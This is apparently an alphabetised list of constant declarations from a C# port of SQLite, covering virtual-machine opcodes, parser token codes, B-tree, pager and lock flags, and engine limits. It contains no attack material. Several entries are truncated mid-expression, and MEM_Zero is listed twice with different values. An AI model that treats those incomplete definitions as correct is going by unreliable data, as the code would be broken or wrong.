    const byte FLAG_INTERN = 2
    const byte FLAG_SIGNED = 1
    const byte FLAG_STRING = 4
    const byte OPFLAG_APPEND = 8
    const byte OPFLAG_ISUPDATE = 4
    const byte OPFLAG_LASTROWID = 2
    const byte OPFLAG_NCHANGE = 1
    const byte OPFLAG_USESEEKRESULT = 16
    const byte PTF_INTKEY = 0x01
    const byte PTF_LEAF = 0x08
    const byte PTF_LEAFDATA = 0x04
    const byte PTF_ZERODATA = 0x02
    const byte TRANS_NONE = 0
    const byte TRANS_READ = 1
    const byte TRANS_WRITE = 2
    const char 
    const char SQLITE_AFF_INTEGER = 'd'
    const char SQLITE_AFF_NONE = 'b'
    const char SQLITE_AFF_NUMERIC = 'c'
    const char SQLITE_AFF_REAL = 'e'
    const char SQLITE_AFF_TEXT = 'a'
    const double SQLITE_BIG_DBL = ( ( (sqlite3_int64)1 ) << 60 )
    const i64 LARGEST_INT64 = i64.MaxValue
    const i64 SMALLEST_INT64 = i64.MinValue
    const int BITVEC_MXHASH = ( BITVEC_NINT / 2 )
    const int BITVEC_NBIT = ( BITVEC_NELEM 
    const int BITVEC_NELEM = ( BITVEC_USIZE / sizeof( BITVEC_TELEM ) )
    const int BITVEC_NINT = ( BITVEC_USIZE / sizeof( u32 ) )
    const int BITVEC_NPTR = ( BITVEC_USIZE / 4 )
    const int BITVEC_SZ = 512
    const int BITVEC_SZELEM = 8
    const int BITVEC_USIZE = ( ( ( BITVEC_SZ - ( 3 
    const int BMS = ( (int)( sizeof( Bitmask ) 
    const int BTCURSOR_MAX_DEPTH = 20
    const int BTREE_AUTOVACUUM_FULL = 1
    const int BTREE_AUTOVACUUM_INCR = 2
    const int BTREE_AUTOVACUUM_NONE = 0
    const int BTREE_CREATE = 32
    const int BTREE_DEFAULT_CACHE_SIZE = 3
    const int BTREE_FILE_FORMAT = 2
    const int BTREE_FREE_PAGE_COUNT = 0
    const int BTREE_INCR_VACUUM = 7
    const int BTREE_INTKEY = 1
    const int BTREE_LARGEST_ROOT_PAGE = 4
    const int BTREE_LEAFDATA = 4
    const int BTREE_MEMORY = 4
    const int BTREE_NO_READLOCK = 2
    const int BTREE_OMIT_JOURNAL = 1
    const int BTREE_READONLY = 8
    const int BTREE_READWRITE = 16
    const int BTREE_SCHEMA_VERSION = 1
    const int BTREE_TEXT_ENCODING = 5
    const int BTREE_USER_VERSION = 6
    const int BTREE_ZERODATA = 2
    const int CACHE_STALE = 0
    const int COLNAME_COLUMN = 4
    const int COLNAME_DATABASE = 2
    const int COLNAME_DECLTYPE = 1
    const int COLNAME_N = 2
    const int COLNAME_NAME = 0
    const int COLNAME_TABLE = 3
    const int CURSOR_FAULT = 3
    const int CURSOR_INVALID = 0
    const int CURSOR_REQUIRESEEK = 2
    const int CURSOR_VALID = 1
    const int EXCLUSIVE_LOCK = 4
    const int EXPRDUP_REDUCE = 0x0001
    const int EXPR_FULLSIZE = 48
    const int EXPR_REDUCEDSIZE = 8216
    const int EXPR_TOKENONLYSIZE = 16392
    const int EXTRA_SIZE = 0
    const int INVALID_FILE_ATTRIBUTES = -1
    const int INVALID_SET_FILE_POINTER = -1
    const int IN_INDEX_EPH = 2
    const int IN_INDEX_INDEX = 3
    const int IN_INDEX_ROWID = 1
    const int JOURNAL_CHUNKSIZE = 4096
    const int JT_CROSS = 0x0002
    const int JT_ERROR = 0x0040
    const int JT_INNER = 0x0001
    const int JT_LEFT = 0x0008
    const int JT_NATURAL = 0x0004
    const int JT_OUTER = 0x0020
    const int JT_RIGHT = 0x0010
    const int MASTER_ROOT = 1
    const int MAX_PATH = 260
    const int MAX_SECTOR_SIZE = 0x10000
    const int MEMDB = 0
    const int MEM_Agg = 0x2000
    const int MEM_Blob = 0x0010
    const int MEM_Dyn = 0x0400
    const int MEM_Ephem = 0x1000
    const int MEM_Int = 0x0004
    const int MEM_Null = 0x0001
    const int MEM_Real = 0x0008
    const int MEM_RowSet = 0x0020
    const int MEM_Static = 0x0800
    const int MEM_Str = 0x0002
    const int MEM_Term = 0x0200
    const int MEM_TypeMask = 0x00ff
    const int MEM_Zero = 0x0000
    const int MEM_Zero = 0x4000
    const int NO_ERROR = 0
    const int NO_LOCK = 0
    const int NULL_DISTINCT_FOR_UNIQUE = 1
    const int N_SORT_BUCKET = 32
    const int OE_Abort = 2
    const int OE_Cascade = 9
    const int OE_Default = 99
    const int OE_Fail = 3
    const int OE_Ignore = 4
    const int OE_None = 0
    const int OE_Replace = 5
    const int OE_Restrict = 6
    const int OE_Rollback = 1
    const int OE_SetDflt = 8
    const int OE_SetNull = 7
    const int OPFLG_IN1 = 0x0004
    const int OPFLG_IN2 = 0x0008
    const int OPFLG_IN3 = 0x0010
    const int OPFLG_JUMP = 0x0001
    const int OPFLG_OUT2_PRERELEASE = 0x0002
    const int OPFLG_OUT3 = 0x0020
    const int OP_Add = 84
    const int OP_AddImm = 42
    const int OP_Affinity = 2
    const int OP_AggFinal = 92
    const int OP_AggStep = 100
    const int OP_And = 67
    const int OP_AutoCommit = 15
    const int OP_BitAnd = 80
    const int OP_BitNot = 93
    const int OP_BitOr = 81
    const int OP_Blob = 121
    const int OP_Clear = 98
    const int OP_Close = 33
    const int OP_CollSeq = 12
    const int OP_Column = 3
    const int OP_Compare = 95
    const int OP_Concat = 89
    const int OP_ContextPop = 105
    const int OP_ContextPush = 59
    const int OP_Copy = 20
    const int OP_Count = 107
    const int OP_CreateIndex = 34
    const int OP_CreateTable = 53
    const int OP_Delete = 91
    const int OP_Destroy = 111
    const int OP_Divide = 87
    const int OP_DropIndex = 62
    const int OP_DropTable = 69
    const int OP_DropTrigger = 61
    const int OP_Eq = 74
    const int OP_Expire = 14
    const int OP_Explain = 115
    const int OP_Found = 128
    const int OP_Function = 22
    const int OP_Ge = 78
    const int OP_Gosub = 47
    const int OP_Goto = 96
    const int OP_Gt = 75
    const int OP_Halt = 39
    const int OP_HaltIfNull = 116
    const int OP_IdxDelete = 64
    const int OP_IdxGE = 63
    const int OP_IdxInsert = 108
    const int OP_IdxLT = 41
    const int OP_IdxRowid = 57
    const int OP_If = 11
    const int OP_IfNeg = 23
    const int OP_IfNot = 68
    const int OP_IfPos = 129
    const int OP_IfZero = 126
    const int OP_IncrVacuum = 56
    const int OP_Insert = 110
    const int OP_Int64 = 37
    const int OP_Integer = 48
    const int OP_IntegrityCk = 17
    const int OP_IsNull = 71
    const int OP_IsUnique = 35
    const int OP_Jump = 132
    const int OP_Last = 54
    const int OP_Le = 76
    const int OP_LoadAnalysis = 114
    const int OP_Lt = 77
    const int OP_MakeRecord = 79
    const int OP_MemMax = 45
    const int OP_Move = 120
    const int OP_Multiply = 86
    const int OP_MustBeInt = 38
    const int OP_Ne = 73
    const int OP_NewRowid = 26
    const int OP_Next = 106
    const int OP_Noop = 24
    const int OP_Not = 19
    const int OP_NotExists = 46
    const int OP_NotFound = 36
    const int OP_NotNull = 72
    const int OP_NotUsed_134 = 134
    const int OP_NotUsed_135 = 135
    const int OP_NotUsed_136 = 136
    const int OP_NotUsed_137 = 137
    const int OP_NotUsed_138 = 138
    const int OP_NotUsed_139 = 139
    const int OP_NotUsed_140 = 140
    const int OP_Null = 119
    const int OP_NullRow = 131
    const int OP_OpenEphemeral = 118
    const int OP_OpenPseudo = 117
    const int OP_OpenRead = 13
    const int OP_OpenWrite = 10
    const int OP_Or = 66
    const int OP_Pagecount = 16
    const int OP_ParseSchema = 31
    const int OP_Permutation = 133
    const int OP_Prev = 49
    const int OP_ReadCookie = 112
    const int OP_Real = 130
    const int OP_RealAffinity = 29
    const int OP_Remainder = 88
    const int OP_ResetCount = 58
    const int OP_ResultRow = 90
    const int OP_Return = 25
    const int OP_Rewind = 122
    const int OP_RowData = 44
    const int OP_RowKey = 8
    const int OP_RowSetAdd = 51
    const int OP_RowSetRead = 50
    const int OP_RowSetTest = 113
    const int OP_Rowid = 40
    const int OP_SCopy = 9
    const int OP_Savepoint = 7
    const int OP_Seek = 5
    const int OP_SeekGe = 109
    const int OP_SeekGt = 123
    const int OP_SeekLe = 55
    const int OP_SeekLt = 70
    const int OP_Sequence = 6
    const int OP_SetCookie = 4
    const int OP_SetNumColumns = 101
    const int OP_ShiftLeft = 82
    const int OP_ShiftRight = 83
    const int OP_Sort = 18
    const int OP_Statement = 43
    const int OP_String = 28
    const int OP_String8 = 94
    const int OP_Subtract = 85
    const int OP_TableLock = 97
    const int OP_ToBlob = 142
    const int OP_ToInt = 144
    const int OP_ToNumeric = 143
    const int OP_ToReal = 145
    const int OP_ToText = 141
    const int OP_Trace = 21
    const int OP_Transaction = 102
    const int OP_VBegin = 124
    const int OP_VColumn = 52
    const int OP_VCreate = 127
    const int OP_VDestroy = 104
    const int OP_VFilter = 103
    const int OP_VNext = 1
    const int OP_VOpen = 32
    const int OP_VRename = 30
    const int OP_VUpdate = 125
    const int OP_Vacuum = 65
    const int OP_Variable = 27
    const int OP_VerifyCookie = 99
    const int OP_Yield = 60
    const int P4_COLLSEQ = ( -4 )
    const int P4_DYNAMIC = ( -1 )
    const int P4_FUNCDEF = ( -5 )
    const int P4_INT32 = ( -14 )
    const int P4_INT64 = ( -13 )
    const int P4_INTARRAY = ( -15 )
    const int P4_KEYINFO = ( -6 )
    const int P4_KEYINFO_HANDOFF = ( -16 )
    const int P4_KEYINFO_STATIC = ( -17 )
    const int P4_MEM = ( -8 )
    const int P4_MPRINTF = ( -11 )
    const int P4_NOTUSED = 0
    const int P4_REAL = ( -12 )
    const int P4_STATIC = ( -2 )
    const int P4_TRANSIENT = ( -9 )
    const int P4_VDBEFUNC = ( -7 )
    const int P4_VTAB = ( -10 )
    const int PAGER_EXCLUSIVE = 4
    const int PAGER_JOURNALMODE_DELETE = 0
    const int PAGER_JOURNALMODE_MEMORY = 4
    const int PAGER_JOURNALMODE_OFF = 2
    const int PAGER_JOURNALMODE_PERSIST = 1
    const int PAGER_JOURNALMODE_QUERY = -1
    const int PAGER_JOURNALMODE_TRUNCATE = 3
    const int PAGER_MAX_PGNO = 2147483647
    const int PAGER_NO_READLOCK = 0x0002
    const int PAGER_OMIT_JOURNAL = 0x0001
    const int PAGER_RESERVED = 2
    const int PAGER_SHARED = 1
    const int PAGER_SYNCED = 5
    const int PAGER_UNLOCK = 0
    const int PENDING_LOCK = 3
    const int PGHDR_DIRTY = 0x002
    const int PGHDR_DONT_WRITE = 0x020
    const int PGHDR_NEED_READ = 0x008
    const int PGHDR_NEED_SYNC = 0x004
    const int PGHDR_REUSE_UNLIKELY = 0x010
    const int PTRMAP_BTREE = 5
    const int PTRMAP_FREEPAGE = 2
    const int PTRMAP_OVERFLOW1 = 3
    const int PTRMAP_OVERFLOW2 = 4
    const int PTRMAP_ROOTPAGE = 1
    const int READ_LOCK = 1
    const int RESERVED_LOCK = 2
    const int ROWSET_ALLOCATION_SIZE = 1024
    const int ROWSET_ENTRY_PER_CHUNK = 63
    const int SAVEPOINT_BEGIN = 0
    const int SAVEPOINT_RELEASE = 1
    const int SAVEPOINT_ROLLBACK = 2
    const int SF_Aggregate = 0x0004
    const int SF_Distinct = 0x0001
    const int SF_Expanded = 0x0010
    const int SF_HasTypeInfo = 0x0020
    const int SF_Resolved = 0x0002
    const int SF_UsesEphemeral = 0x0008
    const int SHARED_LOCK = 1
    const int SQLITE_ACCESS_EXISTS = 0
    const int SQLITE_ACCESS_READ = 2
    const int SQLITE_ACCESS_READWRITE = 1
    const int SQLITE_AFF_MASK = 0x67
    const int SQLITE_ALTER_TABLE = 26
    const int SQLITE_ANALYZE = 28
    const int SQLITE_ASCII = 1
    const int SQLITE_ATTACH = 24
    const int SQLITE_COLL_BINARY = 1
    const int SQLITE_COLL_NOCASE = 2
    const int SQLITE_COLL_REVERSE = 3
    const int SQLITE_COLL_USER = 0
    const int SQLITE_CONFIG_GETMALLOC = 5
    const int SQLITE_CONFIG_GETMUTEX = 11
    const int SQLITE_CONFIG_GETPCACHE = 15
    const int SQLITE_CONFIG_HEAP = 8
    const int SQLITE_CONFIG_LOOKASIDE = 13
    const int SQLITE_CONFIG_MALLOC = 4
    const int SQLITE_CONFIG_MEMSTATUS = 9
    const int SQLITE_CONFIG_MULTITHREAD = 2
    const int SQLITE_CONFIG_MUTEX = 10
    const int SQLITE_CONFIG_PAGECACHE = 7
    const int SQLITE_CONFIG_PCACHE = 14
    const int SQLITE_CONFIG_SCRATCH = 6
    const int SQLITE_CONFIG_SERIALIZED = 3
    const int SQLITE_CONFIG_SINGLETHREAD = 1
    const int SQLITE_COPY = 0
    const int SQLITE_CORE = 1
    const int SQLITE_CREATE_INDEX = 1
    const int SQLITE_CREATE_TABLE = 2
    const int SQLITE_CREATE_TEMP_INDEX = 3
    const int SQLITE_CREATE_TEMP_TABLE = 4
    const int SQLITE_CREATE_TEMP_TRIGGER = 5
    const int SQLITE_CREATE_TEMP_VIEW = 6
    const int SQLITE_CREATE_TRIGGER = 7
    const int SQLITE_CREATE_VIEW = 8
    const int SQLITE_CREATE_VTABLE = 29
    const int SQLITE_CountRows = 0x00000080
    const int SQLITE_DBCONFIG_LOOKASIDE = 1001
    const int SQLITE_DBSTATUS_LOOKASIDE_USED = 0
    const int SQLITE_DEFAULT_AUTOVACUUM = 0
    const int SQLITE_DEFAULT_CACHE_SIZE = 2000
    const int SQLITE_DEFAULT_JOURNAL_SIZE_LIMIT = -1
    const int SQLITE_DEFAULT_MEMSTATUS = 1
    const int SQLITE_DEFAULT_PAGE_SIZE = 1024
    const int SQLITE_DEFAULT_SECTOR_SIZE = 512
    const int SQLITE_DEFAULT_TEMP_CACHE_SIZE = 500
    const int SQLITE_DELETE = 9
    const int SQLITE_DENY = 1
    const int SQLITE_DETACH = 25
    const int SQLITE_DROP_INDEX = 10
    const int SQLITE_DROP_TABLE = 11
    const int SQLITE_DROP_TEMP_INDEX = 12
    const int SQLITE_DROP_TEMP_TABLE = 13
    const int SQLITE_DROP_TEMP_TRIGGER = 14
    const int SQLITE_DROP_TEMP_VIEW = 15
    const int SQLITE_DROP_TRIGGER = 16
    const int SQLITE_DROP_VIEW = 17
    const int SQLITE_DROP_VTABLE = 30
    const int SQLITE_FAULTINJECTOR_COUNT = 1
    const int SQLITE_FAULTINJECTOR_MALLOC = 0
    const int SQLITE_FCNTL_LOCKSTATE = 1
    const int SQLITE_FUNCTION = 31
    const int SQLITE_FUNC_CASE = 0x02
    const int SQLITE_FUNC_COUNT = 0x20
    const int SQLITE_FUNC_EPHEM = 0x04
    const int SQLITE_FUNC_LIKE = 0x01
    const int SQLITE_FUNC_NEEDCOLL = 0x08
    const int SQLITE_FUNC_PRIVATE = 0x10
    const int SQLITE_FullColNames = 0x00000020
    const int SQLITE_FullFSync = 0x00010000
    const int SQLITE_GET_LOCKPROXYFILE = 2
    const int SQLITE_IGNORE = 2
    const int SQLITE_INDEX_CONSTRAINT_EQ = 2
    const int SQLITE_INDEX_CONSTRAINT_GE = 32
    const int SQLITE_INDEX_CONSTRAINT_GT = 4
    const int SQLITE_INDEX_CONSTRAINT_LE = 8
    const int SQLITE_INDEX_CONSTRAINT_LT = 16
    const int SQLITE_INDEX_CONSTRAINT_MATCH = 64
    const int SQLITE_INSERT = 18
    const int SQLITE_IOCAP_ATOMIC = 0x00000001
    const int SQLITE_IOCAP_ATOMIC16K = 0x00000040
    const int SQLITE_IOCAP_ATOMIC1K = 0x00000004
    const int SQLITE_IOCAP_ATOMIC2K = 0x00000008
    const int SQLITE_IOCAP_ATOMIC32K = 0x00000080
    const int SQLITE_IOCAP_ATOMIC4K = 0x00000010
    const int SQLITE_IOCAP_ATOMIC512 = 0x00000002
    const int SQLITE_IOCAP_ATOMIC64K = 0x00000100
    const int SQLITE_IOCAP_ATOMIC8K = 0x00000020
    const int SQLITE_IOCAP_SAFE_APPEND = 0x00000200
    const int SQLITE_IOCAP_SEQUENTIAL = 0x00000400
    const int SQLITE_IOERR_ACCESS = ( SQLITE_IOERR 
    const int SQLITE_IOERR_BLOCKED = ( SQLITE_IOERR 
    const int SQLITE_IOERR_CHECKRESERVEDLOCK = ( SQLITE_IOERR 
    const int SQLITE_IOERR_CLOSE = ( SQLITE_IOERR 
    const int SQLITE_IOERR_DELETE = ( SQLITE_IOERR 
    const int SQLITE_IOERR_DIR_CLOSE = ( SQLITE_IOERR 
    const int SQLITE_IOERR_DIR_FSYNC = ( SQLITE_IOERR 
    const int SQLITE_IOERR_FSTAT = ( SQLITE_IOERR 
    const int SQLITE_IOERR_FSYNC = ( SQLITE_IOERR 
    const int SQLITE_IOERR_LOCK = ( SQLITE_IOERR 
    const int SQLITE_IOERR_NOMEM = ( SQLITE_IOERR 
    const int SQLITE_IOERR_RDLOCK = ( SQLITE_IOERR 
    const int SQLITE_IOERR_READ = ( SQLITE_IOERR 
    const int SQLITE_IOERR_SHORT_READ = ( SQLITE_IOERR 
    const int SQLITE_IOERR_TRUNCATE = ( SQLITE_IOERR 
    const int SQLITE_IOERR_UNLOCK = ( SQLITE_IOERR 
    const int SQLITE_IOERR_WRITE = ( SQLITE_IOERR 
    const int SQLITE_IgnoreChecks = 0x00002000
    const int SQLITE_InTrans = 0x00000008
    const int SQLITE_InternChanges = 0x00000010
    const int SQLITE_JUMPIFNULL = 0x08
    const int SQLITE_LAST_ERRNO = 4
    const int SQLITE_LOCKED_SHAREDCACHE = ( SQLITE_LOCKED 
    const int SQLITE_LOCK_EXCLUSIVE = 4
    const int SQLITE_LOCK_NONE = 0
    const int SQLITE_LOCK_PENDING = 3
    const int SQLITE_LOCK_RESERVED = 2
    const int SQLITE_LOCK_SHARED = 1
    const int SQLITE_LegacyFileFmt = 0x00008000
    const int SQLITE_LoadExtension = 0x00020000
    const int SQLITE_MAGIC_BUSY = 0x403b7906
    const int SQLITE_MAGIC_CLOSED = 0x2f3c2d33
    const int SQLITE_MAGIC_ERROR = 0x55357930
    const int SQLITE_MAGIC_OPEN = 0x1029a697
    const int SQLITE_MAGIC_SICK = 0x3b771290
    const int SQLITE_MALLOC_SOFT_LIMIT = 1024
    const int SQLITE_MAX_ATTACHED = 10
    const int SQLITE_MAX_COLUMN = 2000
    const int SQLITE_MAX_COMPOUND_SELECT = 250
    const int SQLITE_MAX_DEFAULT_PAGE_SIZE = 8192
    const int SQLITE_MAX_EXPR_DEPTH = 1000
    const int SQLITE_MAX_FUNCTION_ARG = 127
    const int SQLITE_MAX_LENGTH = 1000000000
    const int SQLITE_MAX_LIKE_PATTERN_LENGTH = 50000
    const int SQLITE_MAX_PAGE_COUNT = 1073741823
    const int SQLITE_MAX_PAGE_SIZE = 32768
    const int SQLITE_MAX_SQL_LENGTH = 1000000000
    const int SQLITE_MAX_VARIABLE_NUMBER = 999
    const int SQLITE_MAX_VDBE_OP = 25000
    const int SQLITE_MUTEX_FAST = 0
    const int SQLITE_MUTEX_RECURSIVE = 1
    const int SQLITE_MUTEX_STATIC_LRU = 6
    const int SQLITE_MUTEX_STATIC_LRU2 = 7
    const int SQLITE_MUTEX_STATIC_MASTER = 2
    const int SQLITE_MUTEX_STATIC_MEM = 3
    const int SQLITE_MUTEX_STATIC_OPEN = 4
    const int SQLITE_MUTEX_STATIC_PRNG = 5
    const int SQLITE_N_BTREE_META = 10
    const int SQLITE_N_COLCACHE = 10
    const int SQLITE_N_LIMIT = SQLITE_LIMIT_VARIABLE_NUMBER 
    const int SQLITE_NoReadlock = 0x00001000
    const int SQLITE_NullCallback = 0x00000100
    const int SQLITE_PRAGMA = 19
    const int SQLITE_PRINT_BUF_SIZE = 350
    const int SQLITE_READ = 20
    const int SQLITE_REINDEX = 27
    const int SQLITE_ReadUncommitted = 0x00004000
    const int SQLITE_RecoveryMode = 0x00040000
    const int SQLITE_ReverseOrder = 0x00100000
    const int SQLITE_SAVEPOINT = 32
    const int SQLITE_SELECT = 21
    const int SQLITE_SET_LOCKPROXYFILE = 3
    const int SQLITE_SO_ASC = 0
    const int SQLITE_SO_DESC = 1
    const int SQLITE_STATUS_MALLOC_SIZE = 5
    const int SQLITE_STATUS_MEMORY_USED = 0
    const int SQLITE_STATUS_PAGECACHE_OVERFLOW = 2
    const int SQLITE_STATUS_PAGECACHE_SIZE = 7
    const int SQLITE_STATUS_PAGECACHE_USED = 1
    const int SQLITE_STATUS_PARSER_STACK = 6
    const int SQLITE_STATUS_SCRATCH_OVERFLOW = 4
    const int SQLITE_STATUS_SCRATCH_SIZE = 8
    const int SQLITE_STATUS_SCRATCH_USED = 3
    const int SQLITE_STMTSTATUS_FULLSCAN_STEP = 1
    const int SQLITE_STMTSTATUS_SORT = 2
    const int SQLITE_STOREP2 = 0x10
    const int SQLITE_SYNC_DATAONLY = 0x00010
    const int SQLITE_SYNC_FULL = 0x00003
    const int SQLITE_SYNC_NORMAL = 0x00002
    const int SQLITE_ShortColNames = 0x00000040
    const int SQLITE_SqlTrace = 0x00000200
    const int SQLITE_TEMPNAME_SIZE = ( MAX_PATH 
    const int SQLITE_TESTCTRL_ALWAYS = 13
    const int SQLITE_TESTCTRL_ASSERT = 12
    const int SQLITE_TESTCTRL_BENIGN_MALLOC_HOOKS = 10
    const int SQLITE_TESTCTRL_BITVEC_TEST = 8
    const int SQLITE_TESTCTRL_FAULT_INSTALL = 9
    const int SQLITE_TESTCTRL_PENDING_BYTE = 11
    const int SQLITE_TESTCTRL_PRNG_RESET = 7
    const int SQLITE_TESTCTRL_PRNG_RESTORE = 6
    const int SQLITE_TESTCTRL_PRNG_SAVE = 5
    const int SQLITE_TESTCTRL_RESERVE = 14
    const int SQLITE_THREADSAFE = 1
    const int SQLITE_TRANSACTION = 22
    const int SQLITE_UPDATE = 23
    const int SQLITE_VERSION_NUMBER = 300601767
    const int SQLITE_VdbeListing = 0x00000400
    const int SQLITE_VdbeTrace = 0x00000001
    const int SQLITE_WriteSchema = 0x00000800
    const int SRT_Coroutine = 10
    const int SRT_Discard = 4
    const int SRT_EphemTab = 9
    const int SRT_Except = 2
    const int SRT_Exists = 3
    const int SRT_Mem = 6
    const int SRT_Output = 5
    const int SRT_Set = 7
    const int SRT_Table = 8
    const int SRT_Union = 1
    const int TERM_ANDINFO = 0x20
    const int TERM_CODED = 0x04
    const int TERM_COPIED = 0x08
    const int TERM_DYNAMIC = 0x01
    const int TERM_ORINFO = 0x10
    const int TERM_OR_OK = 0x40
    const int TERM_VIRTUAL = 0x02
    const int TF_Autoincrement = 0x08
    const int TF_Ephemeral = 0x02
    const int TF_HasPrimaryKey = 0x04
    const int TF_NeedMetadata = 0x20
    const int TF_Readonly = 0x01
    const int TF_Virtual = 0x10
    const int TIMER_ELAPSED = 0
    const int TIMER_END = 0
    const int TIMER_START = 0
    const int TK_ABORT = 28
    const int TK_ADD = 140
    const int TK_AFTER = 29
    const int TK_AGG_COLUMN = 153
    const int TK_AGG_FUNCTION = 152
    const int TK_ALL = 113
    const int TK_ALTER = 139
    const int TK_ANALYZE = 30
    const int TK_AND = 67
    const int TK_ANY = 65
    const int TK_AS = 24
    const int TK_ASC = 31
    const int TK_ATTACH = 32
    const int TK_AUTOINCR = 103
    const int TK_BEFORE = 33
    const int TK_BEGIN = 5
    const int TK_BETWEEN = 69
    const int TK_BITAND = 80
    const int TK_BITNOT = 93
    const int TK_BITOR = 81
    const int TK_BLOB = 131
    const int TK_BY = 34
    const int TK_CASCADE = 35
    const int TK_CASE = 134
    const int TK_CAST = 36
    const int TK_CHECK = 101
    const int TK_COLLATE = 90
    const int TK_COLUMN = 151
    const int TK_COLUMNKW = 37
    const int TK_COMMA = 25
    const int TK_COMMIT = 10
    const int TK_CONCAT = 89
    const int TK_CONFLICT = 38
    const int TK_CONSTRAINT = 96
    const int TK_CONST_FUNC = 154
    const int TK_CREATE = 17
    const int TK_CTIME_KW = 64
    const int TK_DATABASE = 39
    const int TK_DEFAULT = 97
    const int TK_DEFERRABLE = 109
    const int TK_DEFERRED = 7
    const int TK_DELETE = 105
    const int TK_DESC = 40
    const int TK_DETACH = 41
    const int TK_DISTINCT = 117
    const int TK_DOT = 118
    const int TK_DROP = 111
    const int TK_EACH = 42
    const int TK_ELSE = 137
    const int TK_END = 11
    const int TK_END_OF_FILE = 146
    const int TK_EQ = 74
    const int TK_ESCAPE = 79
    const int TK_EXCEPT = 114
    const int TK_EXCLUSIVE = 9
    const int TK_EXISTS = 20
    const int TK_EXPLAIN = 2
    const int TK_FAIL = 43
    const int TK_FLOAT = 130
    const int TK_FOR = 44
    const int TK_FOREIGN = 110
    const int TK_FROM = 119
    const int TK_FUNCTION = 150
    const int TK_GE = 78
    const int TK_GROUP = 123
    const int TK_GT = 75
    const int TK_HAVING = 124
    const int TK_ID = 26
    const int TK_IF = 18
    const int TK_IGNORE = 45
    const int TK_ILLEGAL = 147
    const int TK_IMMEDIATE = 8
    const int TK_IN = 70
    const int TK_INDEX = 138
    const int TK_INDEXED = 27
    const int TK_INITIALLY = 46
    const int TK_INSERT = 107
    const int TK_INSTEAD = 47
    const int TK_INTEGER = 129
    const int TK_INTERSECT = 115
    const int TK_INTO = 127
    const int TK_IS = 68
    const int TK_ISNULL = 71
    const int TK_JOIN = 120
    const int TK_JOIN_KW = 95
    const int TK_KEY = 50
    const int TK_LE = 76
    const int TK_LIKE_KW = 48
    const int TK_LIMIT = 125
    const int TK_LP = 22
    const int TK_LSHIFT = 82
    const int TK_LT = 77
    const int TK_MATCH = 49
    const int TK_MINUS = 85
    const int TK_NE = 73
    const int TK_NOT = 19
    const int TK_NOTNULL = 72
    const int TK_NULL = 98
    const int TK_OF = 51
    const int TK_OFFSET = 52
    const int TK_ON = 104
    const int TK_OR = 66
    const int TK_ORDER = 122
    const int TK_PLAN = 4
    const int TK_PLUS = 84
    const int TK_PRAGMA = 53
    const int TK_PRIMARY = 99
    const int TK_QUERY = 3
    const int TK_RAISE = 54
    const int TK_REFERENCES = 102
    const int TK_REGISTER = 132
    const int TK_REINDEX = 62
    const int TK_RELEASE = 14
    const int TK_REM = 88
    const int TK_RENAME = 63
    const int TK_REPLACE = 55
    const int TK_RESTRICT = 56
    const int TK_ROLLBACK = 12
    const int TK_ROW = 57
    const int TK_RP = 23
    const int TK_RSHIFT = 83
    const int TK_SAVEPOINT = 13
    const int TK_SELECT = 116
    const int TK_SEMI = 1
    const int TK_SET = 108
    const int TK_SLASH = 87
    const int TK_SPACE = 148
    const int TK_STAR = 86
    const int TK_STRING = 94
    const int TK_TABLE = 16
    const int TK_TEMP = 21
    const int TK_THEN = 136
    const int TK_TO = 15
    const int TK_TO_BLOB = 142
    const int TK_TO_INT = 144
    const int TK_TO_NUMERIC = 143
    const int TK_TO_REAL = 145
    const int TK_TO_TEXT = 141
    const int TK_TRANSACTION = 6
    const int TK_TRIGGER = 58
    const int TK_UMINUS = 91
    const int TK_UNCLOSED_STRING = 149
    const int TK_UNION = 112
    const int TK_UNIQUE = 100
    const int TK_UPDATE = 106
    const int TK_UPLUS = 92
    const int TK_USING = 121
    const int TK_VACUUM = 59
    const int TK_VALUES = 128
    const int TK_VARIABLE = 133
    const int TK_VIEW = 60
    const int TK_VIRTUAL = 61
    const int TK_WHEN = 135
    const int TK_WHERE = 126
    const int UNPACKED_IGNORE_ROWID = 0x0004
    const int UNPACKED_INCRKEY = 0x0008
    const int UNPACKED_NEED_DESTROY = 0x0002
    const int UNPACKED_NEED_FREE = 0x0001
    const int UNPACKED_PREFIX_MATCH = 0x0010
    const int UNPACKED_PREFIX_SEARCH = 0x0020
    const int WHERE_BTM_LIMIT = 0x00200000
    const int WHERE_COLUMN_EQ = 0x00010000
    const int WHERE_COLUMN_IN = 0x00040000
    const int WHERE_COLUMN_NULL = 0x00080000
    const int WHERE_COLUMN_RANGE = 0x00020000
    const int WHERE_DUPLICATES_OK = 0x0008
    const int WHERE_FORCE_TABLE = 0x0040
    const int WHERE_IDX_ONLY = 0x00800000
    const int WHERE_INDEXED = 0x000f0000
    const int WHERE_IN_ABLE = 0x000f1000
    const int WHERE_MULTI_OR = 0x10000000
    const int WHERE_OMIT_CLOSE = 0x0020
    const int WHERE_OMIT_OPEN = 0x0010
    const int WHERE_ONEPASS_DESIRED = 0x0004
    const int WHERE_ORDERBY = 0x01000000
    const int WHERE_ORDERBY_MAX = 0x0002
    const int WHERE_ORDERBY_MIN = 0x0001
    const int WHERE_ORDERBY_NORMAL = 0x0000
    const int WHERE_REVERSE = 0x02000000
    const int WHERE_ROWID_EQ = 0x00001000
    const int WHERE_ROWID_RANGE = 0x00002000
    const int WHERE_TOP_LIMIT = 0x00100000
    const int WHERE_UNIQUE = 0x04000000
    const int WHERE_VIRTUALTABLE = 0x08000000
    const int WO_ALL = 0xfff
    const int WO_AND = 0x200
    const int WO_EQ = 0x002
    const int WO_GE = ( WO_EQ << ( TK_GE - TK_EQ ) )
    const int WO_GT = ( WO_EQ << ( TK_GT - TK_EQ ) )
    const int WO_IN = 0x001
    const int WO_ISNULL = 0x080
    const int WO_LE = ( WO_EQ << ( TK_LE - TK_EQ ) )
    const int WO_LT = ( WO_EQ << ( TK_LT - TK_EQ ) )
    const int WO_MATCH = 0x040
    const int WO_OR = 0x100
    const int WO_SINGLE = 0x0ff
    const int WRC_Abort = 2
    const int WRC_Continue = 0
    const int WRC_Prune = 1
    const int WRITE_LOCK = 2
    const int YYNOCODE = 254
    const int YYNOERRORRECOVERY = 1
    const int YYNRULE = 329
    const int YYNSTATE = 629
    const int YYSTACKDEPTH = 100
    const int YYWILDCARD = 65
    const int YY_ACCEPT_ACTION = (YYNSTATE 
    const int YY_ERROR_ACTION = (YYNSTATE 
    const int YY_NO_ACTION = (YYNSTATE 
    const int YY_REDUCE_MAX = 308
    const int YY_REDUCE_USE_DFLT = (-180)
    const int YY_SHIFT_MAX = 415
    const int YY_SHIFT_USE_DFLT = (-111)
